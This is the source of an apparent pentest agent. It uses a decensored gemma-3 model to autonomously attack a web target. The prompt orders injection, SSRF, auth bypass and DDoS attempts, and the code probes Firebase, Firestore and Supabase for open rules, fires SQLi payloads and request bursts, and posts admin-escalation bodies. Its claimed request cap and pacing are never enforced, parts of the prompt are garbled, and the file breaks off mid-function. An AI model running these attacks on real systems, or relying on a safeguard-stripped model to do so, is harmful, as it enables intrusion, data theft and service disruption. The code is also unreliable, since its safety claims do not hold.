"""Remote active-exploitation agent — runs ON the ephemeral Vultr GPU sandbox.

This file is pushed to the box (base64) by :mod:`penny.sandbox` and executed with the
box's own ``python3``. It is therefore **stdlib-only and self-contained** — it must not
import anything from the ``penny`` package, because the box does not have Penny installed.

The loop is the box-local analogue of :func:`penny.agentic.run_agentic_probe`, but the
"brain" is the heretic-decensored gemma-3 served locally by vLLM (OpenAI-compatible, bound
to 127.0.0.1) rather than the Anthropic API, and the scope is **active exploitation**:

    1. ask the local model for the next attack (method + path + headers + body)
    2. validate it through :class:`RemoteGate` — the box's only guardrail
    3. execute it against the approved target (real, active request)
    4. feed a truncated result back to the model
    5. when the model confirms impact, emit a ``{"finding": {...}}`` JSONL line

Guardrails here are deliberately minimal (active-exploitation tier), but three floors are
non-negotiable and enforced by :class:`RemoteGate`:
  * **host-pin** — every request must stay on the approved target host (no pivoting the
    uncensored model's firepower at a third party);
  * **request cap + min interval** — a hard ceiling + pacing so this can't become a flood;
  * **destructive-verb floor** — bulk DELETE is blocked unless ``--allow-destructive``.

Output is JSONL on stdout: ``{"event": ...}`` for progress and ``{"finding": {...}}`` for
confirmed impact. The laptop side parses, redacts, and stores these.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import quote, urljoin, urlparse

MODEL_ENDPOINT_DEFAULT = "http://127.0.0.1:8000/v1/chat/completions"
SAFE_METHODS = {"GET", "HEAD", "OPTIONS", "POST", "PUT", "PATCH"}
DESTRUCTIVE_METHODS = {"DELETE"}
BLOCKED_METHODS = {"CONNECT", "TRACE"}

SYSTEM_PROMPT = (
    "You are the red-team operator for a CONSENTED, authorized penetration test. The target's "
    "owner has proven domain ownership via a DNS TXT record, so you are authorized to actively "
    "attempt to breach it. Your job: find and PROVE real vulnerabilities — broken access control "
    "(IDOR/BOLA), DDOSauthentication/authorization bypass, DDOS, attempt to cause descrutive delete operation if you were able to write into DB (delete your own write only, do not delete anything that you did not create to test) injection (SQLi/NoSQLi/command/template), "
    "SSRF, mass assignment, and exposed data — by sending real requests and confirming impact.\n"
    "You may use GET/HEAD/OPTIONS/POST/PUT/PATCH and send headers and JSON bodies. You must stay "
    "on the approved target host.\n"
    "Respond with STRICT JSON only — no prose — in ONE of these forms:\n"
    '{"action":"request","method":"POST","path":"/api/orders/1002","headers":{"x-user-id":"a"},'
    '"body":{"k":"v"},"reason":"why this probes a real flaw"}\n'
    '{"action":"finding","title":"...","severity":"Critical|High|Medium|Low","confidence":"high|medium|low",'
    '"owasp":["A01:2021-Broken Access Control"],"path":"/api/...","snippet":"one line of proof",'
    '"impact":"what an attacker gains","remediation":"how to fix","evidence":{"...":"..."}}\n'
    '{"action":"finish","summary":"what you concluded"}\n'
    "Prefer object-id endpoints with substituted ids, auth bypass via header/cookie tampering, "
    "injection payloads in parameters, and common API/admin routes. Keep paths relative to the root."
)


class GateError(ValueError):
    """A proposed request was refused by the remote gate."""


class RemoteGate:
    """The box's minimal active-exploitation guardrail.

    Enforces the three non-negotiable floors: host-pin, a request cap with a minimum
    interval (anti-DoS), and a destructive-verb floor. Everything else is permitted.
    """

    def __init__(
        self,
        target: str,
        *,
        max_requests: int = 60,
        min_interval_seconds: float = 0.2,
        allow_destructive: bool = False,
    ) -> None:
        parsed = urlparse(target)
        if parsed.scheme not in {"http", "https"}:
            raise GateError("target must use http or https")
        if not parsed.hostname:
            raise GateError("target must include a hostname")
        self.base_url = target.rstrip("/")
        self.scheme = parsed.scheme
        self.host = parsed.hostname.lower()
        self.netloc = parsed.netloc.lower()
        self.max_requests = max_requests
        self.min_interval_seconds = min_interval_seconds
        self.allow_destructive = allow_destructive
        # Backend hosts (Firebase/Supabase/etc.) discovered in the TARGET'S OWN client bundle are
        # in-scope — they're the app's own backend. Only recon (not the model) may add to this, so
        # the anti-pivot guarantee holds: the model still can't reach a host the app doesn't use.
        self.extra_hosts: set = set()
        self.request_count = 0
        self._last_request = 0.0

    def allow_backend_host(self, host: str) -> None:
        if host:
            self.extra_hosts.add(host.lower())

    def build_url(self, path: str) -> str:
        candidate = urljoin(f"{self.base_url}/", str(path).lstrip("/"))
        parsed = urlparse(candidate)
        host = (parsed.hostname or "").lower()
        # Host-pin: stay on the approved host OR a backend host found in the app's own bundle.
        if parsed.scheme not in {"http", "https"} or (host != self.host and host not in self.extra_hosts):
            raise GateError("request left the approved target host (host-pin)")
        return candidate

    def check_method(self, method: str) -> str:
        m = method.upper()
        if m in BLOCKED_METHODS:
            raise GateError(f"method blocked: {m}")
        if m in DESTRUCTIVE_METHODS and not self.allow_destructive:
            raise GateError("destructive verb blocked (DELETE); pass --allow-destructive to enable")
        if m not in SAFE_METHODS and m not in DESTRUCTIVE_METHODS:
            raise GateError(f"unknown method: {m}")
        return m

    def execute(self, method: str, path: str, headers, body, *, timeout: float = 12.0, pace: bool = True,
                max_bytes: int = 4096) -> dict:
        m = self.check_method(method)
        url = self.build_url(path)
        data = None
        send_headers = {str(k): str(v) for k, v in (headers or {}).items()}
        if body is not None and m in {"POST", "PUT", "PATCH"}:
            if isinstance(body, (dict, list)):
                data = json.dumps(body).encode("utf-8")
                send_headers.setdefault("Content-Type", "application/json")
            else:
                data = str(body).encode("utf-8")
        request = urllib.request.Request(url, data=data, method=m, headers=send_headers)
        # max_bytes is large for recon (JS bundles are 100s of KB and hold the Firebase config /
        # endpoint strings) and small (4 KB) for ordinary probes where a sample is enough.
        try:
            with urllib.request.urlopen(request, timeout=timeout) as response:
                raw = response.read(max_bytes)
                return {"status": int(response.status), "body": raw.decode("utf-8", "replace"),
                        "content_type": response.headers.get("content-type", "")}
        except urllib.error.HTTPError as error:
            raw = error.read(max_bytes)
            return {"status": int(error.code), "body": raw.decode("utf-8", "replace"),
                    "content_type": error.headers.get("content-type", "") if error.headers else ""}


def emit(obj: dict) -> None:
    sys.stdout.write(json.dumps(obj) + "\n")
    sys.stdout.flush()


def _extract_json(text: str):
    # Thinking models (e.g. Qwen3-*-Thinking) emit a <think>...</think> block before the
    # real answer; drop it so the brace-scan doesn't grab JSON-like text from the reasoning.
    if "</think>" in text:
        text = text.rsplit("</think>", 1)[-1]
    start = text.find("{")
    end = text.rfind("}")
    if start == -1 or end == -1 or end <= start:
        return None
    try:
        return json.loads(text[start : end + 1])
    except json.JSONDecodeError:
        return None


def ask_model(endpoint: str, model: str, transcript: list, *, system: str = SYSTEM_PROMPT, timeout: float = 120.0) -> str:
    """Call the local vLLM OpenAI-compatible endpoint; return the reply text."""
    payload = {
        "model": model,
        "messages": [{"role": "system", "content": system}] + transcript,
        # Instruct models answer with the compact JSON action directly (no <think> block), so a
        # modest completion budget is plenty AND leaves headroom under --max-model-len (8192):
        # prompt + max_tokens must fit, and a too-large value here is what 400s the request.
        "max_tokens": 1024,
        "temperature": 0.7,
        "top_p": 0.8,
        "top_k": 20,
    }
    request = urllib.request.Request(
        endpoint, data=json.dumps(payload).encode("utf-8"),
        method="POST", headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        body = json.loads(response.read().decode("utf-8", "replace"))
    return body["choices"][0]["message"]["content"]


def _trim(transcript: list, *, keep: int = 16) -> list:
    """Keep the seed message + the last `keep-1` exchanges so context never overflows the
    model's window (the cause of the mid-run 'HTTP Error 400'). Older turns are dropped."""
    if len(transcript) <= keep:
        return transcript
    return transcript[:1] + transcript[-(keep - 1):]


def _finding_from(decision: dict, gate: RemoteGate) -> dict:
    path = decision.get("path", "/")
    return {
        "title": str(decision.get("title", "Active exploit confirmed (sandbox)")),
        "severity": str(decision.get("severity", "High")),
        "confidence": str(decision.get("confidence", "high")),
        "owasp": decision.get("owasp") or ["A01:2021-Broken Access Control"],
        "location_file": f"sandbox:{gate.base_url}{path}",
        "snippet": str(decision.get("snippet", ""))[:300],
        "impact": str(decision.get("impact", "")),
        "remediation": str(decision.get("remediation", "")),
        "evidence": decision.get("evidence") or {},
    }


def _body_hash(body: str) -> str:
    import hashlib
    return hashlib.sha1(body.encode("utf-8", "ignore")).hexdigest()


def _ct_family(content_type: str) -> str:
    ct = (content_type or "").lower()
    if "json" in ct:
        return "json"
    if "html" in ct:
        return "html"
    return ct.split(";", 1)[0].strip()


def _norm_path(path: str) -> str:
    p = str(path or "/").split("#", 1)[0].split("?", 1)[0].strip().lower()
    if len(p) > 1:
        p = p.rstrip("/")
    return p or "/"


def compute_baseline(gate: RemoteGate) -> list:
    """Probe known-nonexistent paths to learn how the target answers garbage.

    Many sites (SPAs, catch-all routers) return a generic 200 page for ANY path, so a 200 is NOT
    evidence an endpoint exists. We record those responses' (status, content-type, length, hash)
    and later refuse to count a 'finding' whose proof response just matches this baseline.
    """
    import os
    sigs: list = []
    probes = [f"/penny-nonexistent-{os.getpid()}-zzqq", f"/api/penny-nonexistent-{os.getpid()}/zzqq-9182"]
    for p in probes:
        try:
            r = gate.execute("GET", p, {}, None)
        except Exception:  # noqa: BLE001
            continue
        sigs.append({"status": r["status"], "ct": _ct_family(r["content_type"]),
                     "len": len(r["body"]), "hash": _body_hash(r["body"])})
    return sigs


def matches_baseline(result: dict, baseline: list) -> bool:
    """True if `result` looks like the catch-all garbage response (not a real endpoint)."""
    if not baseline:
        return False
    h = _body_hash(result["body"])
    ct = _ct_family(result["content_type"])
    ln = len(result["body"])
    st = result["status"]
    for s in baseline:
        if h == s["hash"]:
            return True
        # HTML SPAs may vary slightly per path (hash differs) but are still the catch-all page:
        # same status + html + near-equal length. Never matches a JSON API response.
        if st == s["status"] and ct == "html" and s["ct"] == "html" and abs(ln - s["len"]) <= max(128, int(0.08 * s["len"])):
            return True
    return False


# ---------------------------------------------------------------------------
# Client-side recon: read the SPA/JS bundle to find real endpoints + backend config,
# then deterministically probe the backend (Firebase RTDB / Supabase) for open rules.
# This is what catches the "no Firebase rules" class of bug — blind HTTP path-guessing
# against a catch-all SPA never will, because the data lives in a backend on another host
# that the app's own bundle reveals.
# ---------------------------------------------------------------------------

_SCRIPT_SRC_RE = re.compile(r'<(?:script|link)[^>]+(?:src|href)=["\']([^"\']+\.js[^"\']*)["\']', re.I)
_RTDB_URL_RE = re.compile(r'https://[A-Za-z0-9.\-]+\.(?:firebaseio\.com|firebasedatabase\.app)', re.I)
_PROJECT_ID_RE = re.compile(r'projectId["\']?\s*[:=]\s*["\']([A-Za-z0-9\-]+)["\']')
_SUPABASE_URL_RE = re.compile(r'https://[a-z0-9]{16,30}\.supabase\.co', re.I)
_JWT_RE = re.compile(r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}')
_ENDPOINT_RE = re.compile(
    r'["\'`](/(?:api|v1|v2|rest|graphql|auth|account|admin|users?|orders?|payments?|invoices?|'
    r'transactions?|profiles?|cart|checkout|products?|items?|messages?|posts?)[A-Za-z0-9_\-/]*)["\'`]')
_SB_TABLES = ["users", "profiles", "accounts", "orders", "payments", "invoices",
              "transactions", "messages", "posts", "cart", "items", "products"]


def _safe_exec(gate: RemoteGate, method: str, path: str, headers=None, body=None, *, max_bytes: int = 4096):
    try:
        return gate.execute(method, path, headers or {}, body, max_bytes=max_bytes)
    except TypeError:
        # Tolerate gates/fakes whose execute() predates the max_bytes kwargs.
        try:
            return gate.execute(method, path, headers or {}, body)
        except Exception:  # noqa: BLE001
            return None
    except Exception:  # noqa: BLE001 - blocked/errored probes are just skipped during recon
        return None


# SQL-error signatures (error-based injection) — case-insensitive substring match on the body.
_SQL_ERROR_SIGNS = [
    "sql syntax", "syntax error at or near", "unterminated quoted string", "unclosed quotation mark",
    "quoted string not properly terminated", "you have an error in your sql", "sqlite", "psql:",
    "pg::", "ora-0", "mysql", "mariadb", "odbc", "sqlstate",
]
_SQLI_PAYLOADS = ["'", "''", "' OR '1'='1", "1 OR 1=1", "%27", "\"", "');--"]


def _live_endpoints(gate: RemoteGate, info: dict, baseline: list, limit: int = 6) -> list:
    """Endpoints from recon that return a NON-catch-all response (i.e. real, worth attacking)."""
    live = []
    for ep in sorted(info["endpoints"]):
        if len(live) >= limit:
            break
        r = _safe_exec(gate, "GET", ep)
        if r and not matches_baseline(r, baseline):
            live.append(ep)
    return live


def recon(gate: RemoteGate) -> dict:
    """Fetch the page + same-host JS bundles and extract endpoints + backend (Firebase/Supabase) config."""
    info = {"endpoints": set(), "rtdb": set(), "project_ids": set(),
            "supabase_urls": set(), "supabase_keys": set()}
    texts: list = []
    big = 3_000_000  # read full HTML/JS (bundles are 100s of KB); the Firebase config lives deep in them
    root = _safe_exec(gate, "GET", "/", max_bytes=big)
    if root:
        texts.append(root["body"])
    bundles: list = []
    for body in list(texts):
        bundles.extend(_SCRIPT_SRC_RE.findall(body))
    for src in dict.fromkeys(bundles):  # de-dupe, keep order
        if len(texts) > 12:
            break
        r = _safe_exec(gate, "GET", src, max_bytes=big)  # off-host CDN bundles are host-pinned out (skipped)
        if r and r["body"]:
            texts.append(r["body"])
    blob = "\n".join(texts)
    for m in _RTDB_URL_RE.findall(blob):
        info["rtdb"].add(m.rstrip("/"))
    for m in _PROJECT_ID_RE.findall(blob):
        info["project_ids"].add(m)
        info["rtdb"].add(f"https://{m}-default-rtdb.firebaseio.com")
        info["rtdb"].add(f"https://{m}.firebaseio.com")
    for m in _SUPABASE_URL_RE.findall(blob):
        info["supabase_urls"].add(m.rstrip("/"))
    for m in _JWT_RE.findall(blob):
        info["supabase_keys"].add(m)
    for m in _ENDPOINT_RE.findall(blob):
        info["endpoints"].add(m)
    emit({"event": "recon", "endpoints": sorted(info["endpoints"])[:30], "rtdb": sorted(info["rtdb"]),
          "supabase": sorted(info["supabase_urls"]), "project_ids": sorted(info["project_ids"])})
    return info


def probe_firebase(gate: RemoteGate, info: dict) -> int:
    """Check discovered Firebase RTDB URLs for open (no-auth) read rules. Returns findings emitted."""
    found = 0
    for db in sorted(info["rtdb"]):
        host = urlparse(db).hostname
        gate.allow_backend_host(host)
        # `?shallow=true` returns only top-level keys (cheap) and still proves readability.
        for path in ("/.json?shallow=true", "/.json"):
            r = _safe_exec(gate, "GET", db + path)
            if not r:
                continue
            body = (r["body"] or "").strip()
            if r["status"] == 200 and "permission denied" not in body.lower():
                has_data = body not in ("", "null")
                emit({"finding": {
                    "title": "Firebase Realtime Database readable without authentication (open rules)",
                    "severity": "Critical" if has_data else "High",
                    "confidence": "high",
                    "owasp": ["A01:2021-Broken Access Control", "A05:2021-Security Misconfiguration"],
                    "location_file": db + "/.json",
                    "snippet": ("root returned data with no auth" if has_data else "root readable with no auth (currently empty)"),
                    "impact": "Anyone can read the database over REST with no credentials — full data exposure.",
                    "remediation": "Set RTDB security rules to require auth (never .read:true at root); scope reads by uid.",
                    "evidence": {"status": 200, "probe": db + path, "has_data": has_data, "sample": body[:300]},
                }})
                found += 1
                break
    # Firestore (the other Firebase database): list documents in common collections over REST.
    # Open rules return them with no auth (200 + "documents"); locked rules return 403.
    fs_collections = [
        # app-specific collections (demo target)
        "sac_authorized_users", "users", "transactions", "products", "booths", "booth_requests",
        # common defaults
        "orders", "payments", "invoices", "profiles", "accounts", "messages", "posts", "carts", "items",
    ]
    # Also try collection names derived from endpoint path segments found in the JS bundle, so this
    # adapts to any app, not just the seeded names.
    for ep in info.get("endpoints", ()):
        for seg in ep.strip("/").split("/"):
            seg = seg.split("?")[0]
            if re.match(r"^[A-Za-z][A-Za-z0-9_]*$", seg) and seg not in ("api", "v1", "v2", "rest", "graphql"):
                fs_collections.append(seg)
    fs_collections = list(dict.fromkeys(fs_collections))[:30]  # de-dupe, bound the request count
    for pid in sorted(info["project_ids"]):
        gate.allow_backend_host("firestore.googleapis.com")
        base = f"https://firestore.googleapis.com/v1/projects/{pid}/databases/(default)/documents"
        for col in fs_collections:
            r = _safe_exec(gate, "GET", f"{base}/{col}?pageSize=2")
            if not r or r["status"] != 200 or '"documents"' not in r["body"]:
                continue
            emit({"finding": {
                "title": f"Firestore collection '{col}' readable without authentication (open rules)",
                "severity": "Critical", "confidence": "high",
                "owasp": ["A01:2021-Broken Access Control", "A05:2021-Security Misconfiguration"],
                "location_file": f"{base}/{col}",
                "snippet": f"collection '{col}' returned documents with no auth",
                "impact": "Anyone can read this collection over the Firestore REST API with no credentials.",
                "remediation": "Set Firestore security rules to require auth and scope reads by request.auth.uid.",
                "evidence": {"status": 200, "project_id": pid, "collection": col},
            }})
            found += 1
    return found


def probe_supabase(gate: RemoteGate, info: dict) -> int:
    """Check discovered Supabase projects for tables readable with the public anon key (RLS off)."""
    found = 0
    key = next(iter(sorted(info["supabase_keys"], key=len, reverse=True)), "")
    headers = {"apikey": key, "Authorization": f"Bearer {key}"} if key else {}
    for url in sorted(info["supabase_urls"]):
        gate.allow_backend_host(urlparse(url).hostname)
        for table in _SB_TABLES:
            r = _safe_exec(gate, "GET", f"{url}/rest/v1/{table}?select=*&limit=2", headers=headers)
            if not r or r["status"] != 200 or not r["body"].strip().startswith("["):
                continue
            try:
                rows = json.loads(r["body"])
            except Exception:  # noqa: BLE001
                rows = []
            if rows:
                cols = sorted(rows[0].keys())[:20] if isinstance(rows[0], dict) else []
                emit({"finding": {
                    "title": f"Supabase table '{table}' readable without authorization (RLS off)",
                    "severity": "Critical", "confidence": "high",
                    "owasp": ["A01:2021-Broken Access Control"],
                    "location_file": f"{url}/rest/v1/{table}",
                    "snippet": f"{len(rows)} row(s) returned with the public anon key; columns: {cols}",
                    "impact": "Rows the app meant to protect are readable by anyone holding the public anon key.",
                    "remediation": "Enable Row Level Security with owner-scoped policies on every table.",
                    "evidence": {"status": 200, "columns": cols, "row_sample_count": len(rows)},
                }})
                found += 1
    return found


def _recon_note(info: dict) -> str:
    parts = []
    if info["endpoints"]:
        parts.append("Real endpoints found in the site's JS bundle (probe THESE — they are not catch-all): "
                     + ", ".join(sorted(info["endpoints"])[:30]))
    if info["rtdb"]:
        parts.append("Firebase RTDB URL(s) (in scope): " + ", ".join(sorted(info["rtdb"]))
                     + " — append /<path>.json to read; deeper paths may hold data even if root is locked.")
    if info["project_ids"]:
        parts.append("Firestore project(s) (in scope): " + ", ".join(sorted(info["project_ids"]))
                     + " — GET https://firestore.googleapis.com/v1/projects/<id>/databases/(default)/documents/<collection> "
                       "to test rules; try collection names from the endpoints above.")
    if info["supabase_urls"]:
        parts.append("Supabase URL(s) (in scope): " + ", ".join(sorted(info["supabase_urls"]))
                     + " — GET /rest/v1/<table>?select=* with the apikey header to test RLS.")
    return ("\nRECON (from the app's own client bundle):\n- " + "\n- ".join(parts)) if parts else ""


def probe_rate_limit(gate: RemoteGate, info: dict, baseline: list) -> int:
    """Send a bounded, unpaced burst at a live endpoint; flag the absence of rate limiting."""
    live = _live_endpoints(gate, info, baseline, limit=1)
    if not live:
        emit({"event": "probe_skipped", "probe": "rate_limit", "reason": "no live (non-catch-all) endpoint"})
        return 0
    ep = live[0]
    burst = 25
    statuses = []
    for _ in range(burst):
        r = _safe_exec(gate, "GET", ep, pace=False)  # cap still bounds total volume; just no inter-request sleep
        if not r:
            break
        statuses.append(r["status"])
    throttled = sum(1 for s in statuses if s in (429, 503))
    emit({"event": "rate_limit", "endpoint": ep, "sent": len(statuses), "throttled": throttled})
    if len(statuses) >= 10 and throttled == 0:
        emit({"finding": {
            "title": "No rate limiting on API endpoint",
            "severity": "Medium", "confidence": "high",
            "owasp": ["A04:2021-Insecure Design", "A07:2021-Identification and Authentication Failures"],
            "location_file": gate.base_url + ep,
            "snippet": f"{len(statuses)} rapid requests, 0 throttled (no 429/503)",
            "impact": "No throttling enables credential stuffing, brute force, scraping, and trivial DoS.",
            "remediation": "Add per-IP/per-account rate limiting (return 429 past a threshold) plus lockout/backoff.",
            "evidence": {"requests": len(statuses), "throttled": 0, "statuses": statuses[:10]},
        }})
        return 1
    return 0


def probe_injection(gate: RemoteGate, info: dict, baseline: list) -> int:
    """Error-based SQL/NoSQL injection: inject payloads into live endpoints, look for DB errors."""
    found = 0
    for ep in _live_endpoints(gate, info, baseline, limit=6):
        base = _safe_exec(gate, "GET", ep)
        if not base:
            continue
        for payload in _SQLI_PAYLOADS:
            sep = "&" if "?" in ep else "?"
            r = _safe_exec(gate, "GET", f"{ep}{sep}id={quote(payload)}")
            if not r:
                continue
            low = r["body"].lower()
            if any(sig in low for sig in _SQL_ERROR_SIGNS):
                emit({"finding": {
                    "title": "SQL injection (error-based) in endpoint parameter",
                    "severity": "Critical", "confidence": "high",
                    "owasp": ["A03:2021-Injection"],
                    "location_file": gate.base_url + ep,
                    "snippet": f"payload {payload!r} triggered a database error in the response",
                    "impact": "An attacker can read/modify the database via crafted input — full compromise.",
                    "remediation": "Use parameterized queries / an ORM; never build SQL from user input.",
                    "evidence": {"payload": payload, "status": r["status"], "error_excerpt": r["body"][:200]},
                }})
                found += 1
                break
            if r["status"] >= 500 and base["status"] < 500:
                emit({"finding": {
                    "title": "Possible injection — endpoint 500s on a crafted parameter",
                    "severity": "High", "confidence": "medium",
                    "owasp": ["A03:2021-Injection"],
                    "location_file": gate.base_url + ep,
                    "snippet": f"payload {payload!r} changed status {base['status']} -> {r['status']}",
                    "impact": "Unhandled input reaches a backend query/parser; likely injectable.",
                    "remediation": "Validate/parameterize input; handle errors without leaking 500s.",
                    "evidence": {"payload": payload, "baseline_status": base["status"], "status": r["status"]},
                }})
                found += 1
                break
    return found


def probe_writes(gate: RemoteGate, info: dict, baseline: list, *, allow_destructive: bool) -> int:
    """POST a marked test record to live endpoints (unauth-write + mass-assignment); DELETE it back
    only when --allow-destructive. Never mutates pre-existing data by default."""
    import os
    found = 0
    marker = f"penny-sec-test-{os.getpid()}"
    body = {"penny_security_test": True, "marker": marker, "name": marker,
            "role": "admin", "isAdmin": True, "is_admin": True, "amount": 0, "price": 0}
    headers = {"Content-Type": "application/json"}
    for ep in _live_endpoints(gate, info, baseline, limit=6):
        r = _safe_exec(gate, "POST", ep, headers=headers, body=body)
        if not r or matches_baseline(r, baseline) or r["status"] not in (200, 201):
            continue
        echoed = [k for k in ("role", "isAdmin", "is_admin") if f'"{k}"' in r["body"]]
        if echoed:
            emit({"finding": {
                "title": "Mass assignment — privileged fields accepted on create",
                "severity": "Critical", "confidence": "high",
                "owasp": ["A01:2021-Broken Access Control", "A08:2021-Software and Data Integrity Failures"],
                "location_file": gate.base_url + ep,
                "snippet": f"POST accepted and echoed privileged field(s): {echoed}",
                "impact": "Clients can set protected fields (e.g. role/admin/price) the server should control.",
                "remediation": "Whitelist writable fields server-side; never bind request bodies straight to models.",
                "evidence": {"status": r["status"], "echoed_fields": echoed, "marker": marker},
            }})
        else:
            emit({"finding": {
                "title": "Unauthenticated write accepted (POST creates a record without auth)",
                "severity": "High", "confidence": "high",
                "owasp": ["A01:2021-Broken Access Control"],
                "location_file": gate.base_url + ep,
                "snippet": f"unauthenticated POST returned {r['status']} (record created)",
                "impact": "Anyone can create records without authentication.",
                "remediation": "Require authentication + authorization on all write endpoints.",
                "evidence": {"status": r["status"], "marker": marker},
            }})
        found += 1
        # Clean up our marked record (and prove DELETE authz) only if the operator opted in.
        if allow_destructive:
            created_id = ""
            try:
                obj = json.loads(r["body"])
                created_id = str(obj.get("id") or obj.get("_id") or "")
            except Exception:  # noqa: BLE001
                created_id = ""
            if created_id:
                d = _safe_exec(gate, "DELETE", f"{ep.rstrip('/')}/{quote(created_id)}")
                if d and d["status"] in (200, 202, 204):
                    emit({"finding": {
                        "title": "Unauthenticated DELETE accepted",
                        "severity": "Critical", "confidence": "high",
                        "owasp": ["A01:2021-Broken Access Control"],
                        "location_file": f"{gate.base_url}{ep.rstrip('/')}/{created_id}",
                        "snippet": f"unauthenticated DELETE of our test record returned {d['status']}",
                        "impact": "Anyone can delete records without authentication — data loss / integrity.",
                        "remediation": "Require auth + ownership checks on delete endpoints.",
                        "evidence": {"status": d["status"], "deleted_marker_id": created_id},
                    }})
                    found += 1
    return found


def run_loop(gate: RemoteGate, endpoint: str, model: str, *, max_turns: int = 24, system: str = SYSTEM_PROMPT,
             deterministic: bool = True, max_seconds: float | None = None) -> int:
    """Drive the model→gate→execute loop. Returns the number of findings emitted.

    If ``max_seconds`` is set, the MODEL loop runs until that wall-clock budget elapses (timer
    starts after the deterministic probes, so the model gets the full requested duration) rather
    than stopping at ``max_turns``.
    """
    baseline = compute_baseline(gate)
    real_hits: dict[str, bool] = {}   # normalized path -> True if it returned a NON-baseline response
    findings = 0
    # Recon the client bundle, then deterministically probe the backend it points at. These findings
    # are proven by real backend data (not the model's judgement), so they bypass the catch-all check.
    recon_info = recon(gate)
    if deterministic:
        findings += probe_firebase(gate, recon_info)
        findings += probe_supabase(gate, recon_info)
        findings += probe_rate_limit(gate, recon_info, baseline)
        findings += probe_injection(gate, recon_info, baseline)
        findings += probe_writes(gate, recon_info, baseline, allow_destructive=gate.allow_destructive)
    baseline_note = ""
    if baseline:
        b = baseline[0]
        emit({"event": "baseline", "status": b["status"], "content_type": b["ct"], "bytes": b["len"]})
        baseline_note = (
            f"\nIMPORTANT — a probe to a KNOWN-NONEXISTENT path returned HTTP {b['status']} "
            f"{b['ct']} ~{b['len']} bytes. This target is a CATCH-ALL responder: it serves a generic "
            "page for ANY path. A 200 that matches this baseline is NOT proof an endpoint exists or "
            "is vulnerable. Only treat a response as real if it DIFFERS from the baseline (JSON "
            "content-type, materially different body/length, or a different status). Never report a "
            "finding backed only by a baseline-matching response."
        )
    recon_note = _recon_note(recon_info)
    transcript: list = [{"role": "user", "content": f"Target root: {gate.base_url}{baseline_note}{recon_note}\nPropose your first probe."}]
    consecutive_model_errors = 0
    consecutive_no_action = 0
    loop_start = time.monotonic()
    # Time-bounded: a high turn ceiling, stopped by the wall-clock budget. Turn-bounded otherwise.
    turn_cap = 100000 if max_seconds else max_turns
    for turn in range(turn_cap):
        if max_seconds is not None and (time.monotonic() - loop_start) >= max_seconds:
            emit({"event": "time_up", "seconds": round(time.monotonic() - loop_start), "turns": turn})
            break
        transcript = _trim(transcript)
        try:
            reply = ask_model(endpoint, model, transcript, system=system)
            consecutive_model_errors = 0
        except Exception as error:  # noqa: BLE001
            # Don't kill the whole run on one model hiccup (e.g. a transient 400). Trim the
            # context hard and retry; only give up after several failures in a row.
            consecutive_model_errors += 1
            emit({"event": "model_error", "msg": str(error)[:200]})
            if consecutive_model_errors >= 3:
                break
            transcript = transcript[:1] + transcript[-4:]
            continue
        decision = _extract_json(reply)
        if not decision:
            # A single unparseable reply must NOT kill the worker (that left parallel workers idle).
            # Nudge for strict JSON and retry; give up only after several in a row.
            consecutive_no_action += 1
            emit({"event": "no_action", "msg": "model returned no valid JSON action"})
            if consecutive_no_action >= 3:
                break
            transcript.append({"role": "assistant", "content": reply[:400]})
            transcript.append({"role": "user", "content": "That reply had no valid JSON action. Reply with "
                               "EXACTLY ONE JSON object (action: request | finding | finish) and nothing else."})
            continue
        consecutive_no_action = 0
        action = decision.get("action")

        if action == "finish":
            emit({"event": "finish", "msg": str(decision.get("summary", ""))[:500]})
            break

        if action == "finding":
            ok, reason = _validate_finding(str(decision.get("path", "")), real_hits, baseline)
            if not ok:
                emit({"event": "finding_rejected", "path": decision.get("path", ""), "reason": reason})
                transcript.append({"role": "assistant", "content": json.dumps(decision)})
                transcript.append({"role": "user", "content": f"That finding was REJECTED: {reason}. Only "
                                   "report a finding when a real probe to that exact path returned a response "
                                   "that DIFFERS from the catch-all baseline. Keep probing or finish."})
                continue
            finding = _finding_from(decision, gate)
            emit({"finding": finding})
            findings += 1
            transcript.append({"role": "assistant", "content": json.dumps(decision)})
            transcript.append({"role": "user", "content": "Finding recorded. Propose the next probe or finish."})
            continue

        if action != "request":
            emit({"event": "no_action", "msg": f"unknown action: {action}"})
            transcript.append({"role": "assistant", "content": json.dumps(decision)})
            transcript.append({"role": "user", "content": "Unknown action. Use request/finding/finish."})
            continue

        method = str(decision.get("method", "GET"))
        path = str(decision.get("path", "/"))
        headers = decision.get("headers") or {}
        body = decision.get("body")
        reason = str(decision.get("reason", ""))[:200]
        emit({"event": "request", "method": method.upper(), "path": path, "reason": reason})
        try:
            result = gate.execute(method, path, headers, body)
        except GateError as error:
            emit({"event": "blocked", "msg": str(error)})
            transcript.append({"role": "assistant", "content": json.dumps(decision)})
            transcript.append({"role": "user", "content": f"Blocked by gate: {error}. Propose a different probe or finish."})
            continue
        except Exception as error:  # noqa: BLE001
            emit({"event": "request_error", "msg": str(error)[:200]})
            transcript.append({"role": "assistant", "content": json.dumps(decision)})
            transcript.append({"role": "user", "content": f"Request errored: {error}. Try another or finish."})
            continue

        is_catch_all = matches_baseline(result, baseline)
        norm = _norm_path(path)
        real_hits[norm] = real_hits.get(norm, False) or not is_catch_all
        emit({"event": "response", "status": result["status"], "bytes": len(result["body"]),
              "catch_all": is_catch_all})
        result_summary = {"status": result["status"], "content_type": result["content_type"],
                          "body_preview": result["body"][:600],
                          # Tell the model when a 200 is just the catch-all page, not a real endpoint.
                          "matches_catch_all_baseline": is_catch_all}
        # Store the COMPACT decision (not the raw reply, which may carry extra prose) so the
        # transcript stays small and the context window doesn't balloon over a long run.
        transcript.append({"role": "assistant", "content": json.dumps(decision)})
        transcript.append({"role": "user", "content": f"Result: {json.dumps(result_summary)}\n"
                                                      "If this proves a real flaw (and the response is NOT just the "
                                                      "catch-all baseline), emit a finding; else propose the next probe or finish."})
    emit({"event": "done", "findings": findings, "requests": gate.request_count})
    return findings


def _validate_finding(finding_path: str, real_hits: dict, baseline: list) -> tuple:
    """Reject hallucinated findings: a finding must be backed by a probe whose response DIFFERED
    from the catch-all baseline. On a pure catch-all target, every finding is rejected."""
    if not baseline:
        return True, ""  # couldn't baseline (e.g. localhost test) — don't block
    if not any(real_hits.values()):
        return False, ("every probe matched the catch-all baseline — the target returns a generic page "
